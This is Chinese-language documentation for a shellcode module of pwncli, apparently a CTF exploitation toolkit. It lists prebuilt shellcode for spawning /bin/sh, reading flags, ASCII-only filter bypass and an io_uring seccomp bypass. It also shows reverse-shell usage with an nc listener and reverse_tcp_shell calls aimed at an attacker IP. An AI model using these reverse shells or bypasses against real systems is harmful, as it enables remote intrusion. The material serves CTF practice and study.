

# shellcode — Shellcode 商店

`pwncli/utils/shellcode.py` 提供预编译的常用 shellcode。

***

## 1 amd64

```python
ShellcodeMall.amd64.execve_bin_sh       # 27 字节 execve("/bin/sh", 0, 0)
ShellcodeMall.amd64.execveat_bin_sh     # 29 字节 execveat
ShellcodeMall.amd64.cat_flag            # open("flag") + sendfile
ShellcodeMall.amd64.ls_current_dir      # getdents + write 列目录
```

### ASCII-only shellcode

绕过可打印字符过滤：

```python
sc = ShellcodeMall.amd64.ascii_shellcode(reg="rax")
# reg: shellcode 地址所在寄存器
# 支持: rax/rbx/rcx/rdx/rdi/rsi/rsp/rbp
```

### 反弹 shell

使用前需要先在攻击机上监听对应端口，等待目标连接回来：

```bash
# 攻击机上先开监听（二选一）
nc -lvnp 4444
# 或
ncat -lvnp 4444
```

然后在 exploit 中使用反弹 shell shellcode：

```python
# 仅 connect
sc = ShellcodeMall.amd64.reverse_tcp_connect("192.168.1.1", 4444)

# connect + dup2 + execve("/bin/sh")
sc = ShellcodeMall.amd64.reverse_tcp_shell("192.168.1.1", 4444)
```

其中 IP 和端口填攻击机（即运行 `nc -lvnp` 的机器）的地址。目标执行 shellcode 后会主动连接攻击机，攻击机的 nc 会收到一个交互式 shell。

### io_uring 读文件（绕过 seccomp）

当题目通过 seccomp 禁用了 `open` / `openat` / `openat2` 等系统调用时，可以用 `io_uring` 来读取 flag。`io_uring` 通过 `io_uring_setup` (0x1a9) 和 `io_uring_enter` (0x1aa) 两个系统调用完成所有 I/O 操作，很多 seccomp 规则不会拦截它们。

```python
# 默认读 /flag，输出到 stdout
sc = ShellcodeMall.amd64.io_uring_cat_flag()

# 自定义路径和输出 fd
sc = ShellcodeMall.amd64.io_uring_cat_flag("/home/ctf/flag.txt", fd=2)
```

原理：shellcode 内部依次提交三个 SQE（Submission Queue Entry）：
1. `IORING_OP_OPENAT` — 打开文件
2. `IORING_OP_READ` — 读取内容到缓冲区
3. `IORING_OP_WRITE` — 将缓冲区写到指定 fd

每个操作之间有 1 秒 nanosleep 等待 CQE 完成。shellcode 较大（约 670+ 字节），适合堆上部署或 mmap 场景。

***

## 2 i386

```python
ShellcodeMall.i386.execve_bin_sh    # 21 字节
ShellcodeMall.i386.cat_flag
ShellcodeMall.i386.ls_current_dir
ShellcodeMall.i386.reverse_tcp_shell("192.168.1.1", 4444)
```

***

## 3 工具

### generate_payload_for_connect

生成 `connect(fd, buf, 0x10)` 的 `sockaddr_in` 结构体：

```python
buf = ShellcodeMall.generate_payload_for_connect("192.168.1.1", 4444)
assert len(buf) == 0x10
```

### shellcode2unicode

```python
s = shellcode2unicode(b"\x31\xc0\x50")  # -> "\\x31\\xc0\\x50"
```
